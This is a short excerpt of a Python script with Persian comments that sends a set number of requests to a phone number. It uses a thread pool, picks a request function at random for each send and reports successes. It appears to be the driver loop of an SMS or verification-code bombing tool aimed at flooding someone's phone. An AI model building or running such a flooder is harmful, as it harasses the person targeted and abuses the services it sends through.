...
async def send_requests_async(phone, count):
    success_count = 0
    total_requests = 0
    with ThreadPoolExecutor(max_workers=50) as executor:
        for i in range(count):
            # انتخاب تصادفی یک تابع از لیست
            func = random.choice(functions)
            total_requests += 1
            future = executor.submit(func, phone)
            result = future.result()
            success_count += 1 if result else 0
            print(f"{g}[+] Sending request {total_requests}/{count}... {'Success' if result else 'Failed'}")
            await asyncio.sleep(0.1)  # تاخیر 0.1 ثانیه بین هر درخواست
...
# اجرای برنامه
try:
    asyncio.run(send_requests_async(phone, tedad))
